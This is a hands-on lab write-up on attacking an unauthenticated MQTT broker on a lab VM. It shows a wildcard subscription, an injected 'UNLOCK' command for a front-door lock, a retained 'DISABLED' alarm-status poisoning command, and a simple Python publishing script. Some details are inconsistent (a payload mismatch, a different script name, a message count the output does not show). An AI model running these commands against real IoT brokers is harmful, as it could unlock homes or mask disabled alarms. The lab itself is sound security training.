# Day 10 — MQTT Broker Attacks: Injection & Fuzzing

**Phase:** Phase 3 — Network Threat Analysis  
**Ratio:** 30% Theory / 70% Practical

---

## 📘 Theory Summary

MQTT (Message Queuing Telemetry Transport) brokers in default Mosquitto configuration have **no authentication**. Any client that can reach the broker can:
- Subscribe to any topic (wildcard `#` gets everything)
- Publish to any topic
- Inject false data

In a real smart home, this means an attacker could read door lock status, publish `UNLOCK` to a lock's topic, or inject false temperature readings to trigger heating/cooling systems.

**Topic Fuzzing:** MQTT topics are hierarchical paths like `home/bedroom/temperature`. An attacker can enumerate topics by subscribing to `#` (all topics) and publishing to specific topics to trigger device actions.

**Retained Messages:** A message published with the `-r` flag persists on the broker even after the publisher disconnects. Any new subscriber will immediately receive the last retained message — making this a persistent attack vector.

---

## 🔧 Practical Lab

### Setup
- **Attacker:** Kali Linux VM
- **Target:** Ubuntu VM running Mosquitto (IP: `192.168.56.101`)
- **Tool:** `paho-mqtt` Python library

### Step 1 — Subscribe to All Topics (Wildcard)
```bash
mosquitto_sub -h 192.168.56.101 -t '#' -v &
```
The `&` runs the subscriber in the background to monitor all incoming messages in real time.

### Step 2 — Inject a Fake Lock Command
```bash
mosquitto_pub -h 192.168.56.101 -t 'home/lock/frontdoor' -m 'UNLOCK'
```
The subscriber immediately received the injected command:
```
home/lock/frontdoor UNLOCKED
```

### Step 3 — Install Python MQTT Library
```bash
pip3 install paho-mqtt --break-system-packages
```
Output confirmed: `paho-mqtt` already satisfied (version 2.1.0)

### Step 4 — Python MQTT Fuzzer Script

The following script was generated with AI assistance, reviewed, annotated, and saved as `scripts/mqtt-fuzz.py`:

```python
import paho.mqtt.client as mqtt
import sys
import time

# Callback triggered when connection to broker is established
def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print("Connected successfully to broker")
        # Subscribe to all topics using wildcard
        client.subscribe("#")
    else:
        print(f"Connection failed with code {rc}")

# Callback triggered when a message is received on any subscribed topic
def on_message(client, userdata, msg):
    print(f"Received message: '{msg.payload.decode()}' on topic '{msg.topic}'")

def main():
    # Validate command-line argument for broker IP
    if len(sys.argv) != 2:
        print("Usage: python mqtt_enum.py <broker_ip>")
        sys.exit(1)

    broker_ip = sys.argv[1]

    # Create MQTT client instance
    client = mqtt.Client()

    # Assign callback functions
    client.on_connect = on_connect
    client.on_message = on_message

    # Connect to the broker on default MQTT port 1883
    client.connect(broker_ip, 1883, 60)

    # Start network loop in background thread
    client.loop_start()

    # Generate and publish test messages to 20 topic variations
    topics = [f"test/topic/{i}" for i in range(1, 21)]
    for t in topics:
        message = f"Test message for {t}"
        print(f"Publishing to {t}: {message}")
        client.publish(t, message)
        time.sleep(0.2)  # Small delay to avoid flooding the broker

    # Keep script running to continue receiving messages
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Disconnecting...")
        client.loop_stop()
        client.disconnect()

if __name__ == "__main__":
    main()
```

### Step 5 — Fuzzer Results

Ran the fuzzer for 2 minutes. Total messages received: **1822**

Topics discovered during fuzzer run:
```
home/lock/frontdoor UNLOCKED
test/topic/1  Test message for test/topic/1
test/topic/2  Test message for test/topic/2
test/topic/3  Test message for test/topic/3
test/topic/4  Test message for test/topic/4
test/topic/5  Test message for test/topic/5
test/topic/6  Test message for test/topic/6
test/topic/7  Test message for test/topic/7
test/topic/8  Test message for test/topic/8
test/topic/9  Test message for test/topic/9
test/topic/10 Test message for test/topic/10
test/topic/11 Test message for test/topic/11
test/topic/12 Test message for test/topic/12
test/topic/13 Test message for test/topic/13
test/topic/14 Test message for test/topic/14
test/topic/15 Test message for test/topic/15
test/topic/16 Test message for test/topic/16
test/topic/17 Test message for test/topic/17
test/topic/18 Test message for test/topic/18
test/topic/19 Test message for test/topic/19
test/topic/20 Test message for test/topic/20
```

---

## 💾 Retained Message Attack

### Attack Command
```bash
mosquitto_pub -h 192.168.56.101 -t 'home/alarm/status' -m 'DISABLED' -r
```

### Proof of Persistence
After disconnecting and reconnecting as a fresh subscriber:
```bash
mosquitto_sub -h 192.168.56.101 -t 'home/alarm/status' -v
```
Output immediately received without any new publish:
```
home/alarm/status DISABLED
```

### Why This Is Dangerous
- The retained message persisted on the broker **after the attacker disconnected**
- Any **new client** connecting and subscribing to that topic will instantly receive `DISABLED`
- This means an attacker can permanently poison the alarm status topic — every new app, device, or user connecting will believe the alarm is disabled, with no active publisher needed

---

## 🎯 Outcomes

- ✅ Successfully injected commands into MQTT broker (`home/lock/frontdoor UNLOCK`)
- ✅ Python fuzzer written, reviewed, annotated, and executed
- ✅ 1822 messages captured across 20+ topics during fuzzer run
- ✅ Retained message attack demonstrated — message persisted after disconnect
- ✅ Scripts and findings committed to GitHub

---

## 🛠 Tools Used

| Tool | Purpose |
|------|---------|
| Kali Linux VM | Attacker machine |
| Ubuntu VM + Mosquitto | Target MQTT broker |
| `mosquitto_sub` / `mosquitto_pub` | CLI MQTT clients |
| `paho-mqtt` (Python) | MQTT fuzzer library |
| Microsoft Copilot | AI-assisted script generation |
